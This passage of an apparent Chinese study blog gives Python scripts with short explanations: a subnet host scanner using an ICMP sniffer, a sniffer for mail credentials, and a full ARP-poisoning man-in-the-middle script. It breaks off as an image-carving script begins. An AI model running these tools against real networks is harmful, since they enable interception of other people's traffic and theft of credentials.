</span></span><span class=line><span class=cl>        <span class=c1># human readable protocol</span>
</span></span><span class=line><span class=cl>        <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>protocol</span> <span class=o>=</span> <span class=bp>self</span><span class=o>.</span><span class=n>protocol_map</span><span class=p>[</span><span class=bp>self</span><span class=o>.</span><span class=n>protocol_num</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=k>except</span> <span class=ne>IndexError</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=bp>self</span><span class=o>.</span><span class=n>protocol</span> <span class=o>=</span> <span class=nb>str</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>protocol_num</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>ICMP</span><span class=p>(</span><span class=n>Structure</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>_fields_</span> <span class=o>=</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=s2>&#34;type&#34;</span><span class=p>,</span> <span class=n>c_ubyte</span><span class=p>),</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=s2>&#34;code&#34;</span><span class=p>,</span> <span class=n>c_ubyte</span><span class=p>),</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=s2>&#34;checksum&#34;</span><span class=p>,</span> <span class=n>c_ushort</span><span class=p>),</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=s2>&#34;unused&#34;</span><span class=p>,</span> <span class=n>c_ushort</span><span class=p>),</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=s2>&#34;next_hop_mtu&#34;</span><span class=p>,</span> <span class=n>c_ushort</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=fm>__new__</span><span class=p>(</span><span class=bp>cls</span><span class=p>,</span> <span class=n>socket_buffer</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=bp>cls</span><span class=o>.</span><span class=n>from_buffer_copy</span><span class=p>(</span><span class=n>socket_buffer</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=fm>__init__</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>socket_buffer</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=bp>self</span><span class=o>.</span><span class=n>socket_buffer</span> <span class=o>=</span> <span class=n>socket_buffer</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># create a raw socket and bind it to the public interface</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=n>os</span><span class=o>.</span><span class=n>name</span> <span class=o>==</span> <span class=s2>&#34;nt&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>socket_protocol</span> <span class=o>=</span> <span class=n>socket</span><span class=o>.</span><span class=n>IPPROTO_IP</span>
</span></span><span class=line><span class=cl><span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>socket_protocol</span> <span class=o>=</span> <span class=n>socket</span><span class=o>.</span><span class=n>IPPROTO_ICMP</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sniffer</span> <span class=o>=</span> <span class=n>socket</span><span class=o>.</span><span class=n>socket</span><span class=p>(</span><span class=n>socket</span><span class=o>.</span><span class=n>AF_INET</span><span class=p>,</span> <span class=n>socket</span><span class=o>.</span><span class=n>SOCK_RAW</span><span class=p>,</span> <span class=n>socket_protocol</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>sniffer</span><span class=o>.</span><span class=n>bind</span><span class=p>((</span><span class=n>host</span><span class=p>,</span> <span class=mi>0</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># we want the IP headers included in the capture</span>
</span></span><span class=line><span class=cl><span class=n>sniffer</span><span class=o>.</span><span class=n>setsockopt</span><span class=p>(</span><span class=n>socket</span><span class=o>.</span><span class=n>IPPROTO_IP</span><span class=p>,</span> <span class=n>socket</span><span class=o>.</span><span class=n>IP_HDRINCL</span><span class=p>,</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># if we&#39;re on Windows we need to send some ioctl</span>
</span></span><span class=line><span class=cl><span class=c1># to setup promiscuous mode</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=n>os</span><span class=o>.</span><span class=n>name</span> <span class=o>==</span> <span class=s2>&#34;nt&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>sniffer</span><span class=o>.</span><span class=n>ioctl</span><span class=p>(</span><span class=n>socket</span><span class=o>.</span><span class=n>SIO_RCVALL</span><span class=p>,</span> <span class=n>socket</span><span class=o>.</span><span class=n>RCVALL_ON</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># start sending packets</span>
</span></span><span class=line><span class=cl><span class=n>t</span> <span class=o>=</span> <span class=n>threading</span><span class=o>.</span><span class=n>Thread</span><span class=p>(</span><span class=n>target</span><span class=o>=</span><span class=n>udp_sender</span><span class=p>,</span> <span class=n>args</span><span class=o>=</span><span class=p>(</span><span class=n>tgt_subnet</span><span class=p>,</span> <span class=n>tgt_message</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>t</span><span class=o>.</span><span class=n>start</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># read in a single packet</span>
</span></span><span class=line><span class=cl>        <span class=n>raw_buffer</span> <span class=o>=</span> <span class=n>sniffer</span><span class=o>.</span><span class=n>recvfrom</span><span class=p>(</span><span class=mi>65535</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># create an IP header from the first 20 bytes of the buffer</span>
</span></span><span class=line><span class=cl>        <span class=n>ip_header</span> <span class=o>=</span> <span class=n>IP</span><span class=p>(</span><span class=n>raw_buffer</span><span class=p>[:</span><span class=mi>20</span><span class=p>])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Protocol: </span><span class=si>%s</span><span class=s2> </span><span class=si>%s</span><span class=s2> -&gt; </span><span class=si>%s</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=p>(</span>
</span></span><span class=line><span class=cl>            <span class=n>ip_header</span><span class=o>.</span><span class=n>protocol</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=n>ip_header</span><span class=o>.</span><span class=n>src_address</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=n>ip_header</span><span class=o>.</span><span class=n>dst_address</span><span class=p>)</span>
</span></span><span class=line><span class=cl>              <span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># if it&#39;s ICMP we want it</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>ip_header</span><span class=o>.</span><span class=n>protocol</span> <span class=o>==</span> <span class=s2>&#34;ICMP&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=c1># calculate where our ICMP packet starts</span>
</span></span><span class=line><span class=cl>            <span class=n>offset</span> <span class=o>=</span> <span class=n>ip_header</span><span class=o>.</span><span class=n>ihl</span> <span class=o>*</span> <span class=mi>4</span>
</span></span><span class=line><span class=cl>            <span class=n>buf</span> <span class=o>=</span> <span class=n>raw_buffer</span><span class=p>[</span><span class=n>offset</span><span class=p>:</span><span class=n>offset</span> <span class=o>+</span> <span class=n>sizeof</span><span class=p>(</span><span class=n>ICMP</span><span class=p>)]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=c1># create our ICMP structure</span>
</span></span><span class=line><span class=cl>            <span class=n>icmp_header</span> <span class=o>=</span> <span class=n>ICMP</span><span class=p>(</span><span class=n>buf</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;ICMP -&gt; Type: </span><span class=si>%d</span><span class=s2> Code: </span><span class=si>%d</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=p>(</span>
</span></span><span class=line><span class=cl>                <span class=n>icmp_header</span><span class=o>.</span><span class=n>type</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                <span class=n>icmp_header</span><span class=o>.</span><span class=n>code</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                  <span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=c1># now check for the TYPE 3 and CODE 3 which indicates</span>
</span></span><span class=line><span class=cl>            <span class=c1># a host is up but no port available to talk to           </span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>icmp_header</span><span class=o>.</span><span class=n>code</span> <span class=o>==</span> <span class=mi>3</span> <span class=ow>and</span> <span class=n>icmp_header</span><span class=o>.</span><span class=n>type</span> <span class=o>==</span> <span class=mi>3</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                <span class=c1># check to make sure we are receiving the response </span>
</span></span><span class=line><span class=cl>                <span class=c1># that lands in our subnet</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=n>ip_address</span><span class=p>(</span><span class=n>ip_header</span><span class=o>.</span><span class=n>src_address</span><span class=p>)</span> <span class=ow>in</span> <span class=n>ip_network</span><span class=p>(</span><span class=n>tgt_subnet</span><span class=p>):</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                    <span class=c1># test for our magic message</span>
</span></span><span class=line><span class=cl>                    <span class=k>if</span> <span class=n>raw_buffer</span><span class=p>[</span><span class=nb>len</span><span class=p>(</span><span class=n>raw_buffer</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                       <span class=o>-</span> <span class=nb>len</span><span class=p>(</span><span class=n>tgt_message</span><span class=p>):]</span> <span class=o>==</span> <span class=n>tgt_message</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Host Up: </span><span class=si>%s</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>ip_header</span><span class=o>.</span><span class=n>src_address</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># handle CTRL-C</span>
</span></span><span class=line><span class=cl><span class=k>except</span> <span class=ne>KeyboardInterrupt</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=c1># if we&#39;re on Windows turn off promiscuous mode</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>os</span><span class=o>.</span><span class=n>name</span> <span class=o>==</span> <span class=s2>&#34;nt&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>sniffer</span><span class=o>.</span><span class=n>ioctl</span><span class=p>(</span><span class=n>socket</span><span class=o>.</span><span class=n>SIO_RCVALL</span><span class=p>,</span> <span class=n>socket</span><span class=o>.</span><span class=n>RCVALL_OFF</span><span class=p>)</span>
</span></span></code></pre></div><p>目的是找出子網路中的活動ip</p><p>流程是一個thraed對某個子網路的所有ip送udp，如果host還活著，就會退回封包並加上icmp格式的錯誤訊息</p><h2 id=ch4>CH4<a hidden class=anchor aria-hidden=true href=#ch4>#</a></h2><p>mail_sniffer.py</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>kamene.all</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># our packet callback</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>packet_callback</span><span class=p>(</span><span class=n>packet</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>packet</span><span class=p>[</span><span class=n>TCP</span><span class=p>]</span><span class=o>.</span><span class=n>payload</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>mail_packet</span> <span class=o>=</span> <span class=nb>bytes</span><span class=p>(</span><span class=n>packet</span><span class=p>[</span><span class=n>TCP</span><span class=p>]</span><span class=o>.</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=sa>b</span><span class=s1>&#39;user&#39;</span> <span class=ow>in</span> <span class=n>mail_packet</span><span class=o>.</span><span class=n>lower</span><span class=p>()</span> <span class=ow>or</span> <span class=sa>b</span><span class=s1>&#39;pass&#39;</span> <span class=ow>in</span> <span class=n>mail_packet</span><span class=o>.</span><span class=n>lower</span><span class=p>():</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[*] Server: </span><span class=si>%s</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>packet</span><span class=p>[</span><span class=n>IP</span><span class=p>]</span><span class=o>.</span><span class=n>dst</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[*] </span><span class=si>%s</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>packet</span><span class=p>[</span><span class=n>TCP</span><span class=p>]</span><span class=o>.</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># fire up our sniffer</span>
</span></span><span class=line><span class=cl><span class=n>sniff</span><span class=p>(</span><span class=nb>filter</span><span class=o>=</span><span class=s2>&#34;tcp port 110 or tcp port 25 or tcp port 143&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>      <span class=n>prn</span><span class=o>=</span><span class=n>packet_callback</span><span class=p>,</span>
</span></span><span class=line><span class=cl>      <span class=n>store</span><span class=o>=</span><span class=mi>0</span><span class=p>)</span>
</span></span></code></pre></div><p>這應該很直觀，目的是看tcp payload有沒有user與pass</p><p>之後應該補個tcpdump的條件式語法。</p><hr><p>arper.py</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>kamene.all</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>sys</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>threading</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>interface</span> <span class=o>=</span> <span class=s2>&#34;en1&#34;</span>
</span></span><span class=line><span class=cl><span class=n>tgt_ip</span> <span class=o>=</span> <span class=s2>&#34;172.16.1.71&#34;</span>
</span></span><span class=line><span class=cl><span class=n>tgt_gateway</span> <span class=o>=</span> <span class=s2>&#34;172.16.1.254&#34;</span>
</span></span><span class=line><span class=cl><span class=n>packet_count</span> <span class=o>=</span> <span class=mi>1000</span>
</span></span><span class=line><span class=cl><span class=n>poisoning</span> <span class=o>=</span> <span class=kc>True</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>restore_target</span><span class=p>(</span><span class=n>gateway_ip</span><span class=p>,</span> <span class=n>gateway_mac</span><span class=p>,</span> <span class=n>target_ip</span><span class=p>,</span> <span class=n>target_mac</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=c1># slightly different method using send</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[*] Restoring target...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>send</span><span class=p>(</span><span class=n>ARP</span><span class=p>(</span><span class=n>op</span><span class=o>=</span><span class=mi>2</span><span class=p>,</span>
</span></span><span class=line><span class=cl>             <span class=n>psrc</span><span class=o>=</span><span class=n>gateway_ip</span><span class=p>,</span>
</span></span><span class=line><span class=cl>             <span class=n>pdst</span><span class=o>=</span><span class=n>target_ip</span><span class=p>,</span>
</span></span><span class=line><span class=cl>             <span class=n>hwdst</span><span class=o>=</span><span class=s2>&#34;ff:ff:ff:ff:ff:ff&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>             <span class=n>hwsrc</span><span class=o>=</span><span class=n>gateway_mac</span><span class=p>),</span>
</span></span><span class=line><span class=cl>         <span class=n>count</span><span class=o>=</span><span class=mi>5</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>send</span><span class=p>(</span><span class=n>ARP</span><span class=p>(</span><span class=n>op</span><span class=o>=</span><span class=mi>2</span><span class=p>,</span>
</span></span><span class=line><span class=cl>             <span class=n>psrc</span><span class=o>=</span><span class=n>target_ip</span><span class=p>,</span>
</span></span><span class=line><span class=cl>             <span class=n>pdst</span><span class=o>=</span><span class=n>gateway_ip</span><span class=p>,</span>
</span></span><span class=line><span class=cl>             <span class=n>hwdst</span><span class=o>=</span><span class=s2>&#34;ff:ff:ff:ff:ff:ff&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>             <span class=n>hwsrc</span><span class=o>=</span><span class=n>target_mac</span><span class=p>),</span>
</span></span><span class=line><span class=cl>         <span class=n>count</span><span class=o>=</span><span class=mi>5</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>get_mac</span><span class=p>(</span><span class=n>ip_address</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>responses</span><span class=p>,</span> <span class=n>unanswered</span> <span class=o>=</span> <span class=n>srp</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=n>Ether</span><span class=p>(</span><span class=n>dst</span><span class=o>=</span><span class=s2>&#34;ff:ff:ff:ff:ff:ff&#34;</span><span class=p>)</span> <span class=o>/</span> <span class=n>ARP</span><span class=p>(</span><span class=n>pdst</span><span class=o>=</span><span class=n>ip_address</span><span class=p>),</span>
</span></span><span class=line><span class=cl>        <span class=n>timeout</span><span class=o>=</span><span class=mi>2</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=n>retry</span><span class=o>=</span><span class=mi>10</span>
</span></span><span class=line><span class=cl>    <span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># return the MAC address from a response</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>s</span><span class=p>,</span> <span class=n>r</span> <span class=ow>in</span> <span class=n>responses</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>r</span><span class=p>[</span><span class=n>Ether</span><span class=p>]</span><span class=o>.</span><span class=n>src</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>poison_target</span><span class=p>(</span><span class=n>gateway_ip</span><span class=p>,</span> <span class=n>gateway_mac</span><span class=p>,</span> <span class=n>target_ip</span><span class=p>,</span> <span class=n>target_mac</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>poisoning</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>poison_tgt</span> <span class=o>=</span> <span class=n>ARP</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>poison_tgt</span><span class=o>.</span><span class=n>op</span> <span class=o>=</span> <span class=mi>2</span>
</span></span><span class=line><span class=cl>    <span class=n>poison_tgt</span><span class=o>.</span><span class=n>psrc</span> <span class=o>=</span> <span class=n>gateway_ip</span>
</span></span><span class=line><span class=cl>    <span class=n>poison_tgt</span><span class=o>.</span><span class=n>pdst</span> <span class=o>=</span> <span class=n>target_ip</span>
</span></span><span class=line><span class=cl>    <span class=n>poison_tgt</span><span class=o>.</span><span class=n>hwdst</span> <span class=o>=</span> <span class=n>target_mac</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>poison_gateway</span> <span class=o>=</span> <span class=n>ARP</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>poison_gateway</span><span class=o>.</span><span class=n>op</span> <span class=o>=</span> <span class=mi>2</span>
</span></span><span class=line><span class=cl>    <span class=n>poison_gateway</span><span class=o>.</span><span class=n>psrc</span> <span class=o>=</span> <span class=n>target_ip</span>
</span></span><span class=line><span class=cl>    <span class=n>poison_gateway</span><span class=o>.</span><span class=n>pdst</span> <span class=o>=</span> <span class=n>gateway_ip</span>
</span></span><span class=line><span class=cl>    <span class=n>poison_gateway</span><span class=o>.</span><span class=n>hwdst</span> <span class=o>=</span> <span class=n>gateway_mac</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[*] Beginning the ARP poison. [CTRL-C to stop]&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=n>poisoning</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>send</span><span class=p>(</span><span class=n>poison_tgt</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>send</span><span class=p>(</span><span class=n>poison_gateway</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[*] ARP poison attack finished.&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># set our interface</span>
</span></span><span class=line><span class=cl><span class=n>conf</span><span class=o>.</span><span class=n>iface</span> <span class=o>=</span> <span class=n>interface</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># turn off output</span>
</span></span><span class=line><span class=cl><span class=n>conf</span><span class=o>.</span><span class=n>verb</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[*] Setting up </span><span class=si>%s</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>interface</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>tgt_gateway_mac</span> <span class=o>=</span> <span class=n>get_mac</span><span class=p>(</span><span class=n>tgt_gateway</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=n>tgt_gateway_mac</span> <span class=ow>is</span> <span class=kc>None</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[!!!] Failed to get gateway MAC. Exiting.&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sys</span><span class=o>.</span><span class=n>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[*] Gateway </span><span class=si>%s</span><span class=s2> is at </span><span class=si>%s</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=p>(</span><span class=n>tgt_gateway</span><span class=p>,</span> <span class=n>tgt_gateway_mac</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>tgt_mac</span> <span class=o>=</span> <span class=n>get_mac</span><span class=p>(</span><span class=n>tgt_ip</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=n>tgt_mac</span> <span class=ow>is</span> <span class=kc>None</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[!!!] Failed to get target MAC. Exiting.&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sys</span><span class=o>.</span><span class=n>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[*] Target </span><span class=si>%s</span><span class=s2> is at </span><span class=si>%s</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=p>(</span><span class=n>tgt_ip</span><span class=p>,</span> <span class=n>tgt_mac</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># start poison thread</span>
</span></span><span class=line><span class=cl><span class=n>poison_thread</span> <span class=o>=</span> <span class=n>threading</span><span class=o>.</span><span class=n>Thread</span><span class=p>(</span><span class=n>target</span><span class=o>=</span><span class=n>poison_target</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                                 <span class=n>args</span><span class=o>=</span><span class=p>(</span><span class=n>tgt_gateway</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                                       <span class=n>tgt_gateway_mac</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                                       <span class=n>tgt_ip</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                                       <span class=n>tgt_mac</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                                 <span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>poison_thread</span><span class=o>.</span><span class=n>start</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[*] Starting sniffer for </span><span class=si>%d</span><span class=s2> packets&#34;</span> <span class=o>%</span> <span class=n>packet_count</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>bpf_filter</span> <span class=o>=</span> <span class=s2>&#34;ip host </span><span class=si>%s</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>tgt_ip</span>
</span></span><span class=line><span class=cl>    <span class=n>packets</span> <span class=o>=</span> <span class=n>sniff</span><span class=p>(</span><span class=n>count</span><span class=o>=</span><span class=n>packet_count</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                    <span class=nb>filter</span><span class=o>=</span><span class=n>bpf_filter</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                    <span class=n>iface</span><span class=o>=</span><span class=n>interface</span>
</span></span><span class=line><span class=cl>                    <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=c1># write out the captured packets</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[*] Writing packets to arper.pcap&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>wrpcap</span><span class=p>(</span><span class=s1>&#39;arper.pcap&#39;</span><span class=p>,</span> <span class=n>packets</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>except</span> <span class=ne>KeyboardInterrupt</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>pass</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>finally</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>poisoning</span> <span class=o>=</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>    <span class=c1># wait for poisoning thread to exit</span>
</span></span><span class=line><span class=cl>    <span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># restore the network</span>
</span></span><span class=line><span class=cl>    <span class=n>restore_target</span><span class=p>(</span><span class=n>tgt_gateway</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                   <span class=n>tgt_gateway_mac</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                   <span class=n>tgt_ip</span><span class=p>,</span>
</span></span><span class=line><span class=cl>                   <span class=n>tgt_mac</span>
</span></span><span class=line><span class=cl>                   <span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sys</span><span class=o>.</span><span class=n>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span></code></pre></div><p>這裡是做arp汙染，把gateway的eth addr用成自己的
這樣就能上面的sniffer來看封包</p><p>手法是一直發假的arp這樣只要有機器吃到，就會把封包丟到這裡
但現在這個手法都行不通拉 都會被擋</p><hr><p>還有一個是讀pcap來找出圖片，同時對圖片作人臉辨識
pic_carver.py</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>cv2</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>kamene.all</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>pictures_directory</span> <span class=o>=</span> <span class=s2>&#34;pic_carver/pictures&#34;</span>
</span></span><span class=line><span class=cl><span class=n>faces_directory</span> <span class=o>=</span> <span class=s2>&#34;pic_carver/faces&#34;</span>
